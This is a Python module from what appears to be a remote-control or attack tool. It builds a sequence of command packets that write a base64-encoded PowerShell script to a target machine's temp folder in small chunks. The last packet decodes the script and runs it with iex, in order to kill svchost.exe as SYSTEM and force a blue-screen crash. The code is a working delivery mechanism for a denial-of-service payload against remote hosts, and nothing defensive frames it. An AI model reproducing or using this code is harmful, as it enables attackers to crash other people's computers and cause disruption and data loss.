"""蓝屏命令：在目标上以 SYSTEM 权限结束 svchost.exe 触发内核蓝屏。

命令通道单条只有 163 个 UTF-16 单元，装不下完整的 PowerShell 脚本，
因此把脚本转成 base64 后按 90 字符分片写入临时文件，最后一条命令解码执行。
"""

from base64 import b64encode

from app.packets.codec import pkg_sendlist
from app.packets.constants import BLUE_SCREEN_SCRIPT

# 分片大小按单条命令上限反推：写文件的命令还要带上 writer、临时路径与引号。
CHUNK_UNITS = 90

# 临时文件放在目标账号自己的临时目录，执行完随系统重启自然失效。
TEMP_FILE = r"$env:TEMP\bs.b64"


def blue_screen_commands():
    """返回依次下发的命令：先写分片，最后解码执行。

    Returns:
        list[str]: 按顺序执行的命令行，第一条覆盖写入，其余追加。
    """
    encoded = b64encode(BLUE_SCREEN_SCRIPT.encode("utf-8")).decode("ascii")
    commands = []
    for start in range(0, len(encoded), CHUNK_UNITS):
        writer = "Set-Content" if start == 0 else "Add-Content"
        chunk = encoded[start : start + CHUNK_UNITS]
        commands.append("powershell -c \"%s %s '%s'\"" % (writer, TEMP_FILE, chunk))
    commands.append(
        'powershell -c "iex([Text.Encoding]::UTF8.GetString([Convert]::'
        'FromBase64String((Get-Content -Raw %s))))"' % TEMP_FILE
    )
    return commands


def blue_screen_packets():
    """返回蓝屏所需的全部报文。

    Returns:
        list[list[int]]: 待依次发送的命令报文。
    """
    return [pkg_sendlist("-c", command) for command in blue_screen_commands()]
